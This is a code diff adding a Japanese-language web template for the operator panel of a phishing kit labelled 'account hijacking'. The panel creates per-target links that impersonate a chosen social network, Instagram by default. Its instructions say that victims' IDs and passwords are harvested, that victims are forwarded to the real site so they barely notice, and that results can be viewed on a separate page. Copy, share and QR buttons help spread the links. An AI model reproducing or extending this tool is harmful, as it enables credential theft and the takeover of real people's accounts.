@@ -1,0 +1,103 @@
+{% extends "base.html" %}
+{% block title %}アカウント乗っ取り{% endblock %}
+
+{% block head %}
+<style>
+.hj-note{background:#1a2233;border:1px solid #2b3a5a;border-radius:10px;padding:12px;
+  margin:10px 0;font-size:12.5px;color:#bcd0f0;line-height:1.9}
+.hj-row{display:flex;gap:6px;flex-wrap:wrap;align-items:center;margin-top:8px}
+.hj-url{flex:1;min-width:200px;font-family:ui-monospace,Menlo,monospace;font-size:12px;
+  color:#9aa3b2;padding:7px 9px;background:#11141a;border:1px solid #262b36;border-radius:6px}
+.plat{display:inline-block;font-size:11px;padding:2px 8px;border-radius:999px;
+  background:#20242e;border:1px solid #39415a;color:#c7cddb}
+</style>
+{% endblock %}
+
+{% block content %}
+<h1>🕵️ アカウント乗っ取り（フィッシング）</h1>
+<p class="dim">相手に送るURLは <span class="mono">{{ base }}/h/コード</span> です。ログイン不要。
+  相手がID/パスワードを入れると回収し、そのまま本物のSNSへ転送します。
+  結果は <span class="mono">{{ base }}/hp/コード</span> で見ます。</p>
+
+<div class="hj-note">
+  ⚠ <b>使い方</b>：送るSNSの見た目を選んでURLを作り、相手に送るだけ。
+  相手は「いつものログイン画面」だと思ってIDとパスワードを入力します。
+  回収後は本物のサイトへ自動で飛ぶので、ほぼ気づかれません。
+</div>
+
+<h3>新規作成</h3>
+<form method="post" action="/hp/add" class="card">
+  <label>名前 <input type="text" name="name" placeholder="相手の名前" required></label>
+  <label>なりすますSNS
+    <select name="platform">
+      {% for p, label in platforms %}
+      <option value="{{ p }}" {% if p == 'instagram' %}selected{% endif %}>{{ label }}</option>
+      {% endfor %}
+    </select></label>
+  <label>本物の飛び先（空ならそのSNSのトップへ）
+    <input type="text" name="dest" placeholder="https://www.instagram.com/"></label>
+  <label>メモ <input type="text" name="note"></label>
+  <button type="submit">作成してリンクを取得</button>
+</form>
+
+{% if rows %}
+  {% for r in rows %}
+  <div class="card">
+    <div class="hj-row">
+      <b>{{ r.name }}</b> <span class="mono">{{ r.code }}</span>
+      <span class="plat">{{ r.label }}</span>
+      <span class="dim">{{ r.hits or 0 }}回</span>
+      {% if not r.active %}<span class="dim">停止中</span>{% endif %}
+    </div>
+    <div class="hj-row">
+      <input class="hj-url" readonly value="{{ r.share }}" onclick="this.select()">
+      <button class="mini cp" type="button" data-url="{{ r.share }}">コピー</button>
+      <button class="mini sh" type="button" data-url="{{ r.share }}"
+              data-title="{{ r.name }}">共有</button>
+    </div>
+    <div class="hj-row">
+      <a class="btn" href="{{ r.watch }}">結果を見る</a>
+      <a class="btn" href="{{ r.share }}" target="_blank">開く</a>
+      <a class="btn" href="/h/{{ r.code }}/qr.png" target="_blank">QR</a>
+      <form method="post" action="/hp/{{ r.code }}/delete" style="margin:0"
+            onsubmit="return confirm('削除しますか？')">
+        <button class="mini" type="submit">削除</button></form>
+    </div>
+    {% if r.note %}<div class="dim" style="margin-top:6px">{{ r.note }}</div>{% endif %}
+  </div>
+  {% endfor %}
+{% else %}
+  <p class="dim">まだありません。</p>
+{% endif %}
+{% endblock %}
+
+{% block scripts %}
+<script>
+(function () {
+  function copyText(u, b, orig) {
+    function done() { b.textContent = 'コピーしました';
+      setTimeout(function () { b.textContent = orig; }, 1500); }
+    function fb() {
+      try { var t = document.createElement('textarea'); t.value = u;
+            t.style.cssText = 'position:fixed;left:-9999px'; document.body.appendChild(t);
+            t.select(); document.execCommand('copy'); t.remove(); done(); } catch (e) {}
+    }
+    try { navigator.clipboard && navigator.clipboard.writeText
+            ? navigator.clipboard.writeText(u).then(done).catch(fb) : fb(); } catch (e) { fb(); }
+  }
+  document.querySelectorAll('.cp').forEach(function (b) {
+    b.addEventListener('click', function () {
+      copyText(b.getAttribute('data-url') || '', b, b.textContent);
+    });
+  });
+  document.querySelectorAll('.sh').forEach(function (b) {
+    b.addEventListener('click', function () {
+      var u = b.getAttribute('data-url') || '', t = b.getAttribute('data-title') || '';
+      if (navigator.share) {
+        navigator.share({ title: t, text: t, url: u }).catch(function () {});
+      } else { copyText(u, b, b.textContent); }
+    });
+  });
+})();
+</script>
+{% endblock %}
